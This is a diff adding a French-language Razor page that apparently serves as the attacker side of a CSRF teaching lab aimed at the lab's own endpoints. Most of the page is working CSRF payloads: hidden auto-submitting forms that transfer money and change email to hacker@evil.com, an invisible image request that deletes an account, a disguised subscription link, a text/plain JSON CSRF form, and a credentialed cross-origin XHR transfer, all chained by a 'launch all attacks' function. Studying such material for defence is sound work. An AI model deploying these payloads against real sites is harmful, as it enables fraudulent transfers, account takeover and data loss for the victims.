@@ -1,0 +1,287 @@
+﻿@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page d'Attaque CSRF - evil.com</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        .attack-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #2a2a2a;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        .attack-form {
+            background-color: #333;
+            padding: 20px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #666;
+        }
+
+        button {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            margin: 5px;
+        }
+
+            button:hover {
+                background-color: #cc0000;
+            }
+
+        .warning {
+            background-color: #440000;
+            border: 1px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .hidden-frame {
+            display: none;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        .success {
+            color: #00ff00;
+        }
+
+        .log {
+            background-color: #1a1a1a;
+            padding: 10px;
+            margin-top: 20px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-container">
+        <h1>🏴‍☠️ Page d'Attaque CSRF - evil.com 🏴‍☠️</h1>
+
+        <div class="warning">
+            <strong>⚠️ SIMULATION D'ATTAQUE ⚠️</strong><br>
+            Cette page simule comment un attaquant exploiterait les vulnérabilités CSRF.<br>
+            Les actions ci-dessous s'exécuteront sur le site vulnérable si vous êtes connecté !
+        </div>
+
+        <h2>Attaques disponibles :</h2>
+
+        <!-- Attaque 1: Transfert d'argent automatique -->
+        <div class="attack-form">
+            <h3>1. Transfert d'argent silencieux</h3>
+            <p>Cette forme se soumet automatiquement au chargement de la page !</p>
+            <form id="autoTransfer" method="POST" action="/CSRF/TransferMoney" target="hiddenFrame">
+                <input type="hidden" name="toAccount" value="attacker" />
+                <input type="hidden" name="amount" value="500" />
+            </form>
+            <button onclick="document.getElementById('autoTransfer').submit()">
+                💸 Voler 500€ maintenant
+            </button>
+        </div>
+
+        <!-- Attaque 2: Suppression de compte via image -->
+        <div class="attack-form">
+            <h3>2. Suppression de compte via image invisible</h3>
+            <p>Une simple balise image peut déclencher une action GET :</p>
+            <pre>&lt;img src="/CSRF/DeleteAccount?id=1" width="0" height="0"&gt;</pre>
+            <button onclick="loadInvisibleImage()">
+                🗑️ Supprimer le compte d'Alice
+            </button>
+        </div>
+
+        <!-- Attaque 3: Souscription forcée -->
+        <div class="attack-form">
+            <h3>3. Souscription automatique</h3>
+            <p>Forcer une souscription premium via lien déguisé :</p>
+            <a href="/CSRF/Subscribe?plan=premium&monthlyFee=199" style="color: #00ff00;">
+                🎁 Cliquez ici pour gagner un iPhone ! 🎁
+            </a>
+        </div>
+
+        <!-- Attaque 4: Changement d'email -->
+        <div class="attack-form">
+            <h3>4. Changement d'email furtif</h3>
+            <form method="POST" action="/CSRF/ChangeEmail" target="hiddenFrame">
+                <input type="hidden" name="newEmail" value="hacker@evil.com" />
+                <button type="submit">
+                    📧 Changer l'email en hacker@evil.com
+                </button>
+            </form>
+        </div>
+
+        <!-- Attaque 5: JSON CSRF -->
+        <div class="attack-form">
+            <h3>5. JSON CSRF (modification de profil)</h3>
+            <p>Exploite les endpoints JSON sans validation Content-Type stricte :</p>
+            <form id="jsonForm" method="POST" action="/CSRF/UpdateProfileJson" enctype="text/plain" target="hiddenFrame">
+                <input name='{"username":"alice","email":"pwned@evil.com","phone":"666-EVIL","address":"Hacked by CSRF!","padding":"' value='"}' type="hidden">
+                <button type="submit">
+                    👤 Pirater le profil complet
+                </button>
+            </form>
+        </div>
+
+        <!-- Attaque 6: CORS exploitation -->
+        <div class="attack-form">
+            <h3>6. Exploitation CORS (XMLHttpRequest)</h3>
+            <button onclick="corsAttack()">
+                🌐 Attaque CORS cross-origin
+            </button>
+        </div>
+
+        <!-- Log des attaques -->
+        <div class="log" id="attackLog">
+            <strong>📝 Log des attaques :</strong><br>
+        </div>
+
+        <!-- Script d'attaques multiples -->
+        <div class="attack-form">
+            <h3>💀 ATTAQUE TOTALE 💀</h3>
+            <p>Exécuter toutes les attaques en une fois !</p>
+            <button onclick="launchAllAttacks()" style="background-color: #ff0000; font-size: 20px; padding: 15px 30px;">
+                ☠️ LANCER TOUTES LES ATTAQUES ☠️
+            </button>
+        </div>
+    </div>
+
+    <!-- Frame invisible pour les soumissions -->
+    <iframe name="hiddenFrame" class="hidden-frame"></iframe>
+
+    <script>
+        // Log function
+        function log(message, success = false) {
+            const logDiv = document.getElementById('attackLog');
+            const time = new Date().toLocaleTimeString();
+            const color = success ? '#00ff00' : '#ff9900';
+            logDiv.innerHTML += `<span style="color: ${color}">[${time}] ${message}</span><br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // Auto-submit on load (commenté pour la démo)
+        // window.onload = function() {
+        //     document.getElementById('autoTransfer').submit();
+        //     log('💸 Transfert automatique lancé!', true);
+        // };
+
+        // Charger une image invisible
+        function loadInvisibleImage() {
+            const img = new Image();
+            img.src = '/CSRF/DeleteAccount?id=1';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            log('🗑️ Tentative de suppression du compte via image', true);
+        }
+
+        // Attaque CORS
+        function corsAttack() {
+            log('🌐 Lancement de l\'attaque CORS...');
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/CSRF/ApiTransfer', true);
+            xhr.withCredentials = true; // Envoyer les cookies
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    log('✅ CORS attack successful: ' + xhr.responseText, true);
+                }
+            };
+
+            xhr.send('recipient=evil-account&amount=1000');
+        }
+
+        // Lancer toutes les attaques
+        function launchAllAttacks() {
+            log('☠️ LANCEMENT DE TOUTES LES ATTAQUES !!!');
+
+            // 1. Transfert d'argent
+            setTimeout(() => {
+                document.getElementById('autoTransfer').submit();
+                log('💸 Transfert d\'argent lancé', true);
+            }, 100);
+
+            // 2. Suppression de compte
+            setTimeout(() => {
+                loadInvisibleImage();
+            }, 500);
+
+            // 3. Changement d'email
+            setTimeout(() => {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/CSRF/ChangeEmail';
+                form.target = 'hiddenFrame';
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'newEmail';
+                input.value = 'totallyPwned@evil.com';
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                log('📧 Changement d\'email lancé', true);
+            }, 1000);
+
+            // 4. JSON CSRF
+            setTimeout(() => {
+                document.getElementById('jsonForm').submit();
+                log('👤 Modification du profil lancée', true);
+            }, 1500);
+
+            // 5. CORS attack
+            setTimeout(() => {
+                corsAttack();
+            }, 2000);
+
+            // 6. Souscription
+            setTimeout(() => {
+                const img = new Image();
+                img.src = '/CSRF/Subscribe?plan=ultimate&monthlyFee=299';
+                document.body.appendChild(img);
+                log('💳 Souscription forcée lancée', true);
+            }, 2500);
+
+            setTimeout(() => {
+                log('');
+                log('🎯 TOUTES LES ATTAQUES ONT ÉTÉ LANCÉES !', true);
+                log('Vérifiez l\'état du compte sur le site vulnérable...');
+            }, 3000);
+        }
+
+        // Message d'accueil
+        log('Page d\'attaque CSRF chargée depuis evil.com');
+        log('La victime doit être connectée sur le site vulnérable');
+    </script>
+</body>
+</html>
